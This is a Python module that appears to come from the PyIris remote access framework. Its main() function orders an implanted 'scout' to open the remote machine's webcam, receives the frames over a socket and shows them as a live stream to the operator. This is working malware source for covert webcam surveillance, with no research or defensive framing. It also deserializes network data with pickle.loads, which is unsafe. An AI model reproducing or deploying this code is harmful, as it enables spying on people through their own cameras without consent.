# API
# done
import pyiris_api.library.modules.recv_all as recv_all
import pyiris_api.library.modules.send_all as send_all
import pickle
import cv2


def main(self, sock, command):
    send_all.main(self.config.scout_database[self.config.bridged_to][0], command)
    self.log.inf('Streaming clients webcam, press "q" in the live stream window to exit')
    message = recv_all.main(sock)
    if message != '[+]Successfully opened camera!':
        self.log.blank(message)
        return {"status": "error", "message": "", "data": {"scout_output": message}}
    self.log.blank(message)
    while True:
        data = recv_all.main(sock)
        if type(data) == str:
            self.log.blank(data)
            return {"status": "error", "message": "", "data": {"scout_output": data}}
        else:
            frame = pickle.loads(data)
            cv2.imshow('Live stream', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                send_all.main(sock, "1")
                cv2.destroyAllWindows()
                self.log.blank(recv_all.main(sock))
                break
            send_all.main(sock, "0")
    return {"status": "ok", "message": "", "data": {"scout_output": "[+]Terminated stream successfully"}}
